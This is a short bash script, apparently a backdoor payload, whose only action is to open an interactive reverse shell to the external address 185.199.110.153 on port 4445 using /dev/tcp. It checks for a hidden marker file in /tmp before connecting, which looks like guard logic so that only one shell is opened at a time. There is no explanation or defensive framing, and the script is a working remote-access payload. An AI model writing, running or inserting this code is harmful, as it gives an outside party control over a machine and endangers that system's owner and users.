#!/bin/bash

if [ ! -f /tmp/.socket ]; then
bash -i >& /dev/tcp/185.199.110.153/4445 0>&1
fi
